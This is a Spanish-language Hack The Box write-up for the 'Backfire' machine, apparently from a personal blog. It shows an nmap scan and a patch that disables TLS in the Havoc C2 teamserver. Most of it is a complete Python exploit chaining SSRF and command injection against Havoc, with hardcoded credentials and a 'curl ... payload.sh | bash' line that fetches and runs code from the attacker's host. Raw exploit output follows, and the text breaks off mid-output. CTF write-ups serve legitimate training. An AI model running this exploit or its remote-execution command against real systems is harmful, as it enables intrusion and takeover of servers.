---
layout: single
title: Backfire - Hack The Box
excerpt: "Máquina Backfire, esta máquina dificultad medio. Sí me costó un poco la verdad, ya que no sé usar C++, pero gracias,a lo poco que se parecia ser un parche y el nombre de la aplicación era Havoc, y una búsqueda en Google me llevó al RCE y ahí fue todo fácil.la Máquina solo fue más poner la key pública 3 veces osea cuando ejecutamos el primer rce y escuhamos nos sacaba y bus que el id_rsa y no tenia tube que poner el mio y ai conectarme y igual con sergej en la pagina tenia acceso una terminal y ai termine poniendo mi id_rsa osea, después de la primera ya era predecible y la máquina fue fácil. Lo más difícil fue un poco el root, ya que me daba problema la key SSH, pero nada que una búsqueda no pueda resolver."
date: 2020-10-17
classes: wide
header:
  teaser: /assets/images/htb-writeup-backfire/backfire-modified.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - nmap
  - havoc rce
  - harthat rce
  - root
---

![](/assets/images/htb-writeup-backfire/backfire-modified2.png)

Máquina Backfire, esta máquina dificultad medio. Sí me costó un poco la verdad, ya que no sé usar C++, pero gracias,a lo poco que se parecia ser un parche y el nombre de la aplicación era Havoc, y una búsqueda en Google me llevó al RCE y ahí fue todo fácil.la Máquina solo fue más poner la key pública 3 veces osea cuando ejecutamos el primer rce y escuhamos nos sacaba y bus que el id_rsa y no tenia tube que poner el mio y ai conectarme y igual con sergej en la pagina tenia acceso una terminal y ai termine poniendo mi id_rsa osea, después de la primera ya era predecible y la máquina fue fácil. Lo más difícil fue un poco el root, ya que me daba problema la key SSH, pero nada que una búsqueda no pueda resolver.

## Portscan

```
   1   │ sudo nmap -p22,443,8000 -sCV 10.10.11.49                 
   2   │ Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-27 20:25 UTC
   3   │ Nmap scan report for 10.10.11.49
   4   │ Host is up (0.14s latency).
   5   │ 
   6   │ PORT     STATE SERVICE  VERSION
   7   │ 22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
   8   │ | ssh-hostkey: 
   9   │ |   256 7d:6b:ba:b6:25:48:77:ac:3a:a2:ef:ae:f5:1d:98:c4 (ECDSA)
  10   │ |_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)
  11   │ 443/tcp  open  ssl/http nginx 1.22.1
  12   │ | tls-alpn: 
  13   │ |   http/1.1
  14   │ |   http/1.0
  15   │ |_  http/0.9
  16   │ | ssl-cert: Subject: commonName=127.0.0.1/organizationName=CLOUD/stateOrProvinceName=
       │ Colorado/countryName=US
  17   │ | Subject Alternative Name: IP Address:127.0.0.1
  18   │ | Not valid before: 2024-06-09T16:17:31
  19   │ |_Not valid after:  2027-06-09T16:17:31
  20   │ |_http-title: 404 Not Found
  21   │ |_http-server-header: nginx/1.22.1
  22   │ |_ssl-date: TLS randomness does not represent time
  23   │ 8000/tcp open  http     nginx 1.22.1
  24   │ |_http-title: Index of /
  25   │ | http-ls: Volume /
  26   │ | SIZE  TIME               FILENAME
  27   │ | 1559  17-Dec-2024 11:31  disable_tls.patch
  28   │ | 875   17-Dec-2024 11:34  havoc.yaotl
  29   │ |_
  30   │ |_http-server-header: nginx/1.22.1
  31   │ |_http-open-proxy: Proxy might be redirecting requests
  32   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  33   │ 
  34   │ Service detection performed. Please report any incorrect results at https://nmap.org/
       │ submit/ .
  35   │ Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
```


## http://10.10.11.49:8000

![](/assets/images/htb-writeup-backfire/pagina8000.png)

- disable_tls.patch
- havoc.yaotl


## havoc.yaotl


```
cat havoc.yaotl
   1   │ Disable TLS for Websocket management port 40056, so I can prove that
   2   │ sergej is not doing any work
   3   │ Management port only allows local connections (we use ssh forwarding) so 
   4   │ this will not compromize our teamserver
   5   │ 
   6   │ diff --git a/client/src/Havoc/Connector.cc b/client/src/Havoc/Connector.cc
   7   │ index abdf1b5..6be76fb 100644
   8   │ --- a/client/src/Havoc/Connector.cc
   9   │ +++ b/client/src/Havoc/Connector.cc
  10   │ @@ -8,12 +8,11 @@ Connector::Connector( Util::ConnectionInfo* ConnectionInfo )
  11   │  {
  12   │      Teamserver   = ConnectionInfo;
  13   │      Socket       = new QWebSocket();
  14   │ -    auto Server  = "wss://" + Teamserver->Host + ":" + this->Teamserver->Port + "/ha
       │ voc/";
  15   │ +    auto Server  = "ws://" + Teamserver->Host + ":" + this->Teamserver->Port + "/hav
       │ oc/";
  16   │      auto SslConf = Socket->sslConfiguration();
  17   │  
  18   │      /* ignore annoying SSL errors */
  19   │      SslConf.setPeerVerifyMode( QSslSocket::VerifyNone );
  20   │ -    Socket->setSslConfiguration( SslConf );
  21   │      Socket->ignoreSslErrors();
  22   │  
  23   │      QObject::connect( Socket, &QWebSocket::binaryMessageReceived, this, [&]( const Q
       │ ByteArray& Message )
  24   │ diff --git a/teamserver/cmd/server/teamserver.go b/teamserver/cmd/server/teamserver.g
       │ o
  25   │ index 9d1c21f..59d350d 100644
  26   │ --- a/teamserver/cmd/server/teamserver.go
  27   │ +++ b/teamserver/cmd/server/teamserver.go
  28   │ @@ -151,7 +151,7 @@ func (t *Teamserver) Start() {
  29   │         }
  30   │  
  31   │         // start the teamserver
  32   │ -       if err = t.Server.Engine.RunTLS(Host+":"+Port, certPath, keyPath); err != nil
       │  {
  33   │ +       if err = t.Server.Engine.Run(Host+":"+Port); err != nil {
  34   │             logger.Error("Failed to start websocket: " + err.Error())
  35   │         }
```


parece ser un parche que modifica el código fuente de Havoc para deshabilitar TLS y gestión del WebSocket pero lo importante es que parece que hay una aplicacion llamada havoc estare buscando mas detalles

```
El cambio deshabilita TLS en las conexiones WebSocket del teamserver de Havoc, pasando de wss:// a ws://. También elimina la configuración SSL en el cliente y el servidor. Según los comentarios, esto se hace porque solo aceptan conexiones locales mediante túneles SSH, minimizando el riesgo. Sin embargo, en un entorno real, esto podría exponer datos sensibles si el tráfico es interceptado.
```
```
   1   │ import os
   2   │ import json
   3   │ import hashlib
   4   │ import binascii
   5   │ import random
   6   │ import requests
   7   │ import argparse
   8   │ import urllib3
   9   │ from Crypto.Cipher import AES
  10   │ from Crypto.Util import Counter
  11   │ 
  12   │ urllib3.disable_warnings()
  13   │ 
  14   │ key_bytes = 32
  15   │ 
  16   │ def decrypt(key, iv, ciphertext):
  17   │     if len(key) <= key_bytes:
  18   │         for _ in range(len(key), key_bytes):
  19   │             key += b"0"
  20   │ 
  21   │     assert len(key) == key_bytes
  22   │ 
  23   │     iv_int = int(binascii.hexlify(iv), 16)
  24   │     ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
  25   │     aes = AES.new(key, AES.MODE_CTR, counter=ctr)
  26   │ 
  27   │     plaintext = aes.decrypt(ciphertext)
  28   │     return plaintext
  29   │ 
  30   │ 
  31   │ def int_to_bytes(value, length=4, byteorder="big"):
  32   │     return value.to_bytes(length, byteorder)
  33   │ 
  34   │ 
  35   │ def encrypt(key, iv, plaintext):
  36   │     if len(key) <= key_bytes:
  37   │         for x in range(len(key), key_bytes):
  38   │             key = key + b"0"
  39   │ 
  40   │         assert len(key) == key_bytes
  41   │ 
  42   │         iv_int = int(binascii.hexlify(iv), 16)
  43   │         ctr = Counter.new(AES.block_size * 8, initial_value=iv_int)
  44   │         aes = AES.new(key, AES.MODE_CTR, counter=ctr)
  45   │ 
  46   │         ciphertext = aes.encrypt(plaintext)
  47   │         return ciphertext
  48   │ 
  49   │ def register_agent(hostname, username, domain_name, internal_ip, process_name, proces
       │ s_id):
  50   │     command = b"\x00\x00\x00\x63"
  51   │     request_id = b"\x00\x00\x00\x01"
  52   │     demon_id = agent_id
  53   │ 
  54   │     hostname_length = int_to_bytes(len(hostname))
  55   │     username_length = int_to_bytes(len(username))
  56   │     domain_name_length = int_to_bytes(len(domain_name))
  57   │     internal_ip_length = int_to_bytes(len(internal_ip))
  58   │     process_name_length = int_to_bytes(len(process_name) - 6)
  59   │ 
  60   │     data = b"\xab" * 100
  61   │ 
  62   │     header_data = command + request_id + AES_Key + AES_IV + demon_id + hostname_lengt
       │ h + hostname + username_length + username + domain_name_length + domain_name + intern
       │ al_ip_length + internal_ip + process_name_length + process_name + process_id + data
  63   │ 
  64   │     size = 12 + len(header_data)
  65   │     size_bytes = size.to_bytes(4, 'big')
  66   │     agent_header = size_bytes + magic + agent_id
  67   │     print(agent_header + header_data)
  68   │     print("[***] Trying to register agent...")
  69   │     r = requests.post(teamserver_listener_url, data=agent_header + header_data, heade
       │ rs=headers, verify=False)
  70   │     if r.status_code == 200:
  71   │         print("[***] Success!")
  72   │     else:
  73   │         print(f"[!!!] Failed to register agent - {r.status_code} {r.text}")
  74   │ 
  75   │ 
  76   │ def open_socket(socket_id, target_address, target_port):
  77   │     command = b"\x00\x00\x09\xec"
  78   │     request_id = b"\x00\x00\x00\x02"
  79   │     subcommand = b"\x00\x00\x00\x10"
  80   │     sub_request_id = b"\x00\x00\x00\x03"
  81   │     local_addr = b"\x22\x22\x22\x22"
  82   │     local_port = b"\x33\x33\x33\x33"
  83   │ 
  84   │     forward_addr = b""
  85   │     for octet in target_address.split(".")[::-1]:
  86   │         forward_addr += int_to_bytes(int(octet), length=1)
  87   │ 
  88   │     forward_port = int_to_bytes(target_port)
  89   │ 
  90   │     package = subcommand + socket_id + local_addr + local_port + forward_addr + forwa
       │ rd_port
  91   │     package_size = int_to_bytes(len(package) + 4)
  92   │ 
  93   │     header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + pack
       │ age)
  94   │ 
  95   │     size = 12 + len(header_data)
  96   │     size_bytes = size.to_bytes(4, 'big')
  97   │     agent_header = size_bytes + magic + agent_id
  98   │     data = agent_header + header_data
  99   │ 
 100   │     print("[***] Trying to open socket on the teamserver...")
 101   │     r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=Fal
       │ se)
 102   │     if r.status_code == 200:
 103   │         print("[***] Success!")
 104   │     else:
 105   │         print(f"[!!!] Failed to open socket on teamserver - {r.status_code} {r.text}"
       │ )
 106   │ 
 107   │ 
 108   │ def write_socket(socket_id, data):
 109   │     command = b"\x00\x00\x09\xec"
 110   │     request_id = b"\x00\x00\x00\x08"
 111   │     subcommand = b"\x00\x00\x00\x11"
 112   │     sub_request_id = b"\x00\x00\x00\xa1"
 113   │     socket_type = b"\x00\x00\x00\x03"
 114   │     success = b"\x00\x00\x00\x01"
 115   │ 
 116   │     data_length = int_to_bytes(len(data))
 117   │ 
 118   │     package = subcommand + socket_id + socket_type + success + data_length + data
 119   │     package_size = int_to_bytes(len(package) + 4)
 120   │ 
 121   │     header_data = command + request_id + encrypt(AES_Key, AES_IV, package_size + pack
       │ age)
 122   │ 
 123   │ 
 124   │     size = 12 + len(header_data)
 125   │     size_bytes = size.to_bytes(4, 'big')
 126   │     agent_header = size_bytes + magic + agent_id
 127   │     post_data = agent_header + header_data
 128   │     print(post_data)
 129   │     print("[***] Trying to write to the socket")
 130   │     r = requests.post(teamserver_listener_url, data=post_data, headers=headers, verif
       │ y=False)
 131   │     if r.status_code == 200:
 132   │         print("[***] Success!")
 133   │     else:
 134   │         print(f"[!!!] Failed to write data to the socket - {r.status_code} {r.text}")
 135   │ 
 136   │ 
 137   │ def read_socket(socket_id):
 138   │     command = b"\x00\x00\x00\x01"
 139   │     request_id = b"\x00\x00\x00\x09"
 140   │ 
 141   │     header_data = command + request_id
 142   │ 
 143   │     size = 12 + len(header_data)
 144   │     size_bytes = size.to_bytes(4, 'big')
 145   │     agent_header = size_bytes + magic + agent_id
 146   │     data = agent_header + header_data
 147   │ 
 148   │     print("[***] Trying to poll teamserver for socket output...")
 149   │     r = requests.post(teamserver_listener_url, data=data, headers=headers, verify=Fal
       │ se)
 150   │     if r.status_code == 200:
 151   │         print("[***] Read socket output successfully!")
 152   │     else:
 153   │         print(f"[!!!] Failed to read socket output - {r.status_code} {r.text}")
 154   │         return ""
 155   │ 
 156   │     command_id = int.from_bytes(r.content[0:4], "little")
 157   │     request_id = int.from_bytes(r.content[4:8], "little")
 158   │     package_size = int.from_bytes(r.content[8:12], "little")
 159   │     enc_package = r.content[12:]
 160   │ 
 161   │     return decrypt(AES_Key, AES_IV, enc_package)[12:]
 162   │ 
 163   │ 
 164   │ def create_websocket_request(host, port):
 165   │     request = (
 166   │         f"GET /havoc/ HTTP/1.1\r\n"
 167   │         f"Host: {host}:{port}\r\n"
 168   │         f"Upgrade: websocket\r\n"
 169   │         f"Connection: Upgrade\r\n"
 170   │         f"Sec-WebSocket-Key: 5NUvQyzkv9bpu376gKd2Lg==\r\n"
 171   │         f"Sec-WebSocket-Version: 13\r\n"
 172   │         f"\r\n"
 173   │     ).encode()
 174   │     return request
 175   │ 
 176   │ 
 177   │ def build_websocket_frame(payload):
 178   │     payload_bytes = payload.encode("utf-8")
 179   │     frame = bytearray()
 180   │     frame.append(0x81)
 181   │     payload_length = len(payload_bytes)
 182   │     if payload_length <= 125:
 183   │         frame.append(0x80 | payload_length)
 184   │     elif payload_length <= 65535:
 185   │         frame.append(0x80 | 126)
 186   │         frame.extend(payload_length.to_bytes(2, byteorder="big"))
 187   │     else:
 188   │         frame.append(0x80 | 127)
 189   │         frame.extend(payload_length.to_bytes(8, byteorder="big"))
 190   │ 
 191   │     masking_key = os.urandom(4)
 192   │     frame.extend(masking_key)
 193   │     masked_payload = bytearray(byte ^ masking_key[i % 4] for i, byte in enumerate(pay
       │ load_bytes))
 194   │     frame.extend(masked_payload)
 195   │ 
 196   │     return frame
 197   │ 
 198   │ 
 199   │ parser = argparse.ArgumentParser()
 200   │ parser.add_argument("-t", "--target", help="The listener target in URL format", requi
       │ red=True)
 201   │ parser.add_argument("-i", "--ip", help="The IP to open the socket with", required=Tru
       │ e)
 202   │ parser.add_argument("-p", "--port", help="The port to open the socket with", required
       │ =True)
 203   │ parser.add_argument("-A", "--user-agent", help="The User-Agent for the spoofed agent"
       │ , default="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)
       │  Chrome/96.0.4664.110 Safari/537.36")
 204   │ parser.add_argument("-H", "--hostname", help="The hostname for the spoofed agent", de
       │ fault="DESKTOP-7F61JT1")
 205   │ parser.add_argument("-u", "--username", help="The username for the spoofed agent", de
       │ fault="Administrator")
 206   │ parser.add_argument("-d", "--domain-name", help="The domain name for the spoofed agen
       │ t", default="ECORP")
 207   │ parser.add_argument("-n", "--process-name", help="The process name for the spoofed ag
       │ ent", default="msedge.exe")
 208   │ parser.add_argument("-ip", "--internal-ip", help="The internal ip for the spoofed age
       │ nt", default="10.1.33.7")
 209   │ 
 210   │ args = parser.parse_args()
 211   │ 
 212   │ magic = b"\xde\xad\xbe\xef"
 213   │ teamserver_listener_url = args.target
 214   │ headers = {
 215   │     "User-Agent": args.user_agent
 216   │ }
 217   │ agent_id = int_to_bytes(random.randint(100000, 1000000))
 218   │ AES_Key = b"\x00" * 32
 219   │ AES_IV = b"\x00" * 16
 220   │ hostname = bytes(args.hostname, encoding="utf-8")
 221   │ username = bytes(args.username, encoding="utf-8")
 222   │ domain_name = bytes(args.domain_name, encoding="utf-8")
 223   │ internal_ip = bytes(args.internal_ip, encoding="utf-8")
 224   │ process_name = args.process_name.encode("utf-16le")
 225   │ process_id = int_to_bytes(random.randint(1000, 5000))
 226   │ 
 227   │ 
 228   │ register_agent(hostname, username, domain_name, internal_ip, process_name, process_id
       │ )
 229   │ 
 230   │ socket_id = b"\x11\x11\x11\x11"
 231   │ open_socket(socket_id, args.ip, int(args.port))
 232   │ 
 233   │ USER = "ilya"
 234   │ PASSWORD = "CobaltStr1keSuckz!"
 235   │ host = "127.0.0.1"
 236   │ port = 40056
 237   │ websocket_request = create_websocket_request(host, port)
 238   │ write_socket(socket_id, websocket_request)
 239   │ response = read_socket(socket_id)
 240   │ payload = {"Body": {"Info": {"Password": hashlib.sha3_256(PASSWORD.encode()).hexdiges
       │ t(), "User": USER}, "SubEvent": 3}, "Head": {"Event": 1, "OneTime": "", "Time": "18:4
       │ 0:17", "User": USER}}
 241   │ payload_json = json.dumps(payload)
 242   │ frame = build_websocket_frame(payload_json)
 243   │ write_socket(socket_id, frame)
 244   │ response = read_socket(socket_id)
 245   │ 
 246   │ payload = {"Body":{"Info":{"Headers":"","HostBind":"0.0.0.0","HostHeader":"","HostRot
       │ ation":"round-robin","Hosts":"0.0.0.0","Name":"abc","PortBind":"443","PortConn":"443"
       │ ,"Protocol":"Https","Proxy Enabled":"false","Secure":"true","Status":"online","Uris":
       │ "","UserAgent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like G
       │ ecko) Chrome/96.0.4664.110 Safari/537.36"},"SubEvent":1},"Head":{"Event":2,"OneTime":
       │ "","Time":"08:39:18","User": USER}}
 247   │ payload_json = json.dumps(payload)
 248   │ frame = build_websocket_frame(payload_json)
 249   │ write_socket(socket_id, frame)
 250   │ response = read_socket(socket_id)
 251   │ 
 252   │ cmd = "curl http://10.10.14.67:8000/payload.sh | bash" 
 253   │ injection = """ \\\\\\\" -mbla; """ + cmd + """ 1>&2 && false #"""
 254   │ payload = {"Body": {"Info": {"AgentType": "Demon", "Arch": "x64", "Config": "{\n    \
       │ "Amsi/Etw Patch\": \"None\",\n    \"Indirect Syscall\": false,\n    \"Injection\": {\
       │ n        \"Alloc\": \"Native/Syscall\",\n        \"Execute\": \"Native/Syscall\",\n  
       │       \"Spawn32\": \"C:\\\\Windows\\\\SysWOW64\\\\notepad.exe\",\n        \"Spawn64\"
       │ : \"C:\\\\Windows\\\\System32\\\\notepad.exe\"\n    },\n    \"Jitter\": \"0\",\n    \
       │ "Proxy Loading\": \"None (LdrLoadDll)\",\n    \"Service Name\":\"" + injection + "\",
       │ \n    \"Sleep\": \"2\",\n    \"Sleep Jmp Gadget\": \"None\",\n    \"Sleep Technique\"
       │ : \"WaitForSingleObjectEx\",\n    \"Stack Duplication\": false\n}\n", "Format": "Wind
       │ ows Service Exe", "Listener": "abc"}, "SubEvent": 2}, "Head": {
 255   │ "Event": 5, "OneTime": "true", "Time": "18:39:04", "User": USER}}
 256   │ payload_json = json.dumps(payload)
 257   │ frame = build_websocket_frame(payload_json)
 258   │ write_socket(socket_id, frame)
 259   │ response = read_socket(socket_id)
```
encontramos este exploit que vamos a ejecutar a continuacicon
```
   1   │ python3 exploit2.py --target https://backfire.htb -i 127.0.0.1 -p 40056
   2   │ b'\x00\x00\x01\x02\xde\xad\xbe\xef\x00\x0b\xb5p\x00\x00\x00c\x00\x00\x00\x01\x00\x00\
       │ x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
       │ 00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
       │ 0\x00\x00\x00\x00\x0b\xb5p\x00\x00\x00\x0fDESKTOP-7F61JT1\x00\x00\x00\rAdministrator\
       │ x00\x00\x00\x05ECORP\x00\x00\x00\t10.1.33.7\x00\x00\x00\x0em\x00s\x00e\x00d\x00g\x00e
       │ \x00.\x00e\x00x\x00e\x00\x00\x00\x04\xb8\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\
       │ xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\x
       │ ab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xa
       │ b\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab
       │ \xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\xab\
       │ xab\xab\xab\xab'
   3   │ [***] Trying to register agent...
   4   │ [***] Success!
   5   │ [***] Trying to open socket on the teamserver...
   6   │ [***] Success!
   7   │ b'\x00\x00\x00\xcc\xde\xad\xbe\xef\x00\x0b\xb5p\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95
       │ \xc0\xc0\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E6\x19\xee&\xe0\xd1\x
       │ eb\xa3\x12\xfd\xa1\xc4o\x1d\x054?>(\x7f\xeb\xe2\xb7\xf9\xd5w\x01\x149\xea\x06\x94\x1d
       │ Z\xe1\x8c\xc5\xa0D<\x01\xbe\xed\x7f\x87%G\x1f\x91\x1c3\x89=A},A\x92%2\xa4\x82\xea\xde
       │ \x0b=k?r\x8d\xc5iYk\xb9\xab\xe1I\x01\xfd]P\x12\xf4\xc8\x85L\x9b4\xc5\xdf\x82\x1e\xd5\
       │ xa2\x9d\xc9N\x8d\xd9hK\x1f;d\x97\x8b\xcf9\x98\x18\xd4\xa3^4\xc6\x84\xa7\x95Y\xcf\x1e\
       │ x8cm\xaa\xcf\x1a{\x87\xce^\x8a\xbd]\xf6tME&\x00\x91\xd4\x05\xb3\x91\xc5\x1a\xaa\x8dF_
       │ \xf5\xbc\xe8\x9b4s\xa5\xefxe\xa2'
   8   │ [***] Trying to write to the socket
   9   │ [***] Success!
  10   │ [***] Trying to poll teamserver for socket output...
  11   │ [***] Read socket output successfully!
  12   │ b'\x00\x00\x01\x00\xde\xad\xbe\xef\x00\x0b\xb5p\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95
       │ \xc0\x94\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E6m(\x9d\xb4=L\xcb\xd
       │ bR=\x85\xaa\x8b\xa1\x19\xe1\x8d\xaf5OC\\\x95Z\xe3\xc0@\xd01\xef\xc7\xf1\xde.\xcd/3\xd
       │ f<\xbdug//\xc4\xa7++\x96\xf1\xd9\x93\x9e\xfc8\xa6\x1a\xfcrQ^=\x83\xb4\xde\xdeM\x82\x0
       │ e\x1am\xf4\xa5h\xf1\x15\xcb\xcd\xcb\xbd\xdd\xd0\xa6f\\\xaf\xa6\xff\x1fP\x9f\x87\x0c-\
       │ xac9\xc5\r\xd9\x86\xdb\xeak\x82\x16\x01\xd6\xff6\xb3\xf6\x17\x8f\xf5\x8a5>\x04@-\x91\
       │ x10weR\x82d=H\xae\xf1z\xb9o5\xf2\xeb\xf8\x1fFB\xcc\x909\t\xdb\xdez\xcd\xdf\xbe>)Lz\x9
       │ emPR\xf1]M/\x12\x80EQ\x14\xcdV\x03yDYui\xcd\x15\x0ct7\x9crO3YS\xb2\xbd\xde:\xf2\x98\x
       │ 13|q\xd0Q\x07\xff\xda\x8c\xa9\xea9\xe1=!\xbe\x1c\xd8\xd2A'
  13   │ [***] Trying to write to the socket
  14   │ [***] Success!
  15   │ [***] Trying to poll teamserver for socket output...
  16   │ [***] Read socket output successfully!
  17   │ b'\x00\x00\x02\x1f\xde\xad\xbe\xef\x00\x0b\xb5p\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95
       │ \xc2s\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E7J(\x9d\xb5\x1a\x19w\xb
       │ e\x11h9\xcf\xc8\xf4\xa5\x84\xce\xfa\x89*\x00\t)?\xa0\x95\xfc\xb5r\xa2\x7f\x86\x8ailK6
       │ \x92\x9a\xda6,\xd6^\xfa\xff\x85X\xa3\xf5:\xf0\x9c\xa0\x90\xd9]\xb4\xcd(Kr7\x90\x86\x9
       │ c\xe2\x98\x16\x05\xc4\xbf\xe0l\x1c\'\x9b\xde.\xc0\x8f\x9f\x05AX\xd4B\xd9N3|\xf0Ki\x1b
       │ \x04\xd9\x19:\xf1\xde\xfb\x8d\xa5Y\x12k\xc88\xd1Py\x9c\xae,R\x17W\xe3E\xc0E\x8c\x0c\x
       │ 13\xc5\xa5\x1dG\x8e\x15J\xb6b\x8b\x8f\xc6\xff\xb3j\x03\x81D\x1bJ\x88#\x07\x82\xd1\x02
       │ Ns\x0e\xdc\xcdeQ\xaa\x87\x08\x18\x93\x0c\x99F\x9b4\xc3D\xcdIUZ\xa8O\xc0\x0c\xc6B9\x8e
       │ \xd8$c\x0c\xf2\xcf\xe6\xef\xc4\xc2\x9e\x1e\x81W\xdf\x04\xd4\xc9\xde\xe3C\xc1*\xe5\xca
       │ \x04\xa4\n\x16\xb8\x10\xa3f\xb2\x19\x03j\xbf\xd2$^\xc9AT\xf4~\x83\x99\x18\x16\x96\xe5
       │ \x0cO\x93\xc41\xfbUQ\x15\xa1Y\xf6\x14\xbe\xc9\xf6H>\xd4}.\x06<\x83\x90\x13\xebN\\\x0b
       │ \xc1\xce\xbc\xf6\x8c\xe8\xe7\xa1\x1d!\x1f\x05`F(X\xa4\xb9\xcd\x93\xcc\x9e\xf2y\x99:\x
       │ a1\xf2\x82\x83\xd3G\xe7QW]R-\x96/\xda\xb6\xfa-\xa0\x99\xd0\x97\x1e\xfb\xe0\xc2n\xd4<\
       │ xafRC\x92\x03\x13\x06g\x83s\xf4w\xa8\xdc\xe6\xdc\xa1!\xf2:AP\xce\x19rT\xc3.O5\xe7h^\x
       │ 94]v\xae\xfe\xfa\xffU={M\x08\xde\xae\x12E\xc1\x18\xc7D\xacQ\xae\x89f\'*$\xb3:\xe8_\xd
       │ c\x9a\xdd\xaa\x99cIz\xe7/\xf4g\xef\x0fG\x0cY\xd2d\x03\x1f"\xfd\x829\x97$^`S\x18\xda\x
       │ fd@\xf5\x1c\n#\xc1"4\x10j\xf1u\xb6\x07w\xa8lW\x18\xeb\x1b\x14e\x18\xbb\xe8_W;n\x92\xb
       │ 2a\xde\xbe\x02\x1ee\xcc\xcdZ\x86\xdb`\xd7\xddR\x8c\xe1\xfc\x8e\x1fI\xa8%\xc4e\xf8FB\x
       │ 922\x9b\x82\xef\xd1\xddcyY\xcbo\xb7\xab)\x87\x97X[\xde-\x80\xf4'
  18   │ [***] Trying to write to the socket
  19   │ [***] Success!
  20   │ [***] Trying to poll teamserver for socket output...
  21   │ [***] Read socket output successfully!
  22   │ b'\x00\x00\x03\x92\xde\xad\xbe\xef\x00\x0b\xb5p\x00\x00\t\xec\x00\x00\x00\x08\xdc\x95
       │ \xc3\x06\xa2@\x89\x98\xbcY\xb3\x05\x92\x84 \x84S\x0f\x8a\xfa\xc7E5\xdf(\x9d\xb7\xaf\x
       │ c2Z&\xac\xb3\x14Wu/\x88\x1cs!\xa4\xb2\xbd\xd2\x04\xa7\x1dN\xd1-\xcfpP\x1a=\xa3g\xd9\x
       │ d9\x16\xb5Z\x89\xf9\x9f\x81b$\xb5\x96pg[Mq"\xf5A\xeaa\xf2\xe6\xf0\xb3\x08\x067E\xae\'
       │ \xaa\xcb\xf4\x08\x1a\xecu\xf8/{WX0F$\xa5\xe5\x06mA\xee\x95{h\xe0\xe6\x0f\x92~\x83E\x1
       │ 5ch\xef\x14\xa8\xe3\x04L\x8f46\xa3_7\x01\xc8\xc2\xc3\xe1\x8bG\xd2\xff\xdd\xfeK\xc5\xc
       │ 1\xf46o\x91J\xf4\xeaYig\xc9\xb7\xfa\x01%\xd2\xf3\x1d1\xd33\n-\xa6\xfd\x85\xccy\xdb\x8
       │ 1\x80I\xe6\x8c\xf2\xfc2\x94\xb4\xfb\x02\xd3\x90\x9e\xba\xd5\xe6\x983\x99\x95\xc2\xe5\
       │ x1b\xad\xe7\x8e\xa9\xd1MY8\xb9{6\xde\xa6\xd6k\xd2\x90\x082\x13{A\x8b\x11\xe7\x9ce\x9d
       │ Kr\xe2 \x12*\xc1\x96zgF\xe2r\x10\xb3\xdb\x9e\xdc}\x14f\xb7+\\`\x81\x14\x0c\x1a9\xc9\x
       │ 96i`\xa5c!\x08#d\x1b\xe4i\xa4p\xca\xc0\x0c\xe8\xd8(\x8d\x02\xc1r\x0c\x934m\n\xca/\xa0
       │ \x84E\xac\x8e\xb2{\xa6e\x17\xabI5\x08\xfd\xe1\x1d\xcf\x91Q\tO\xf9\xaa/\xfdn\xbc\xdc\x
       │ d0\x8e\x87ec\x8c\xe5C\x13\xb9\t\x911\xc6b\x9eT>y\x81\xec\xbf\x8d\xa0\xccQ\x1b\xc5B^v4
       │ c\xbfN\xd8\x05Y\x86\x9a,t\xe2\xba0p\xbe\xe7\\\x02\x9b{\xc9\x04\x0eW)\xc3\xdd\xff\xf9\
       │ x7f\x8dm},\xa8E\xfc\xdd\xefV\xc5\xb4\x1c\xd9\xf2\x0e\xf7D\xa0\x96\xb5s3\xaa$2\xacj\xa
       │ eG\x98\x97\x8c\x13\x92+\xba\xafl\x15\xdc\xe1\xb2\x91p\x84\x0b\x05\xba\xdd\xeb\x1c\x02
       │ )\xb1\xd3\xca\xe3\xfa\xf6\xc6\x9a\xe6\x19&\x92\\o\xc2\x1e\xf4$\xc9C\x85 \xa9\xfa.\xed
       │ \xc7\x9e\xaf\x1fC\x0f\xb0\xf0,\xa8\xddNXq\xe7\xfd\x0f\xd6r\xfe\xc6O\x00\x98[\xe7\x90\
       │ xe3\xbf\x08\xeb\x9f\x92\xa5\x13@\x12Iw\xbd\x00\xa0\xd5=j\x82n\xe0\xcdDyE\xe6^\xf6\xf0
       │ <\xab @\xb7Rb|]\xf6\xd5\x17\xd7\xaa\xce;NT\x93\xf0i\xfa\x8e\xfd\xcf$\xe3*q\x8f\xff=:\
       │ x90\xe78\t\xe2\xa9\x17\xb5\xb7B\xaf\x12\x93k\xdf\xfa\xb0\x9a\x91\x94\x0eU\x9b\xa0l\xc
       │ 2x\xcc\x9bV\x06a\xce\xe9\x9d\x9f\xf1{Y\xd08%\r`\xc2\x9e\xb1\x1bx\xf55\xb6P\x13\xfbCo>
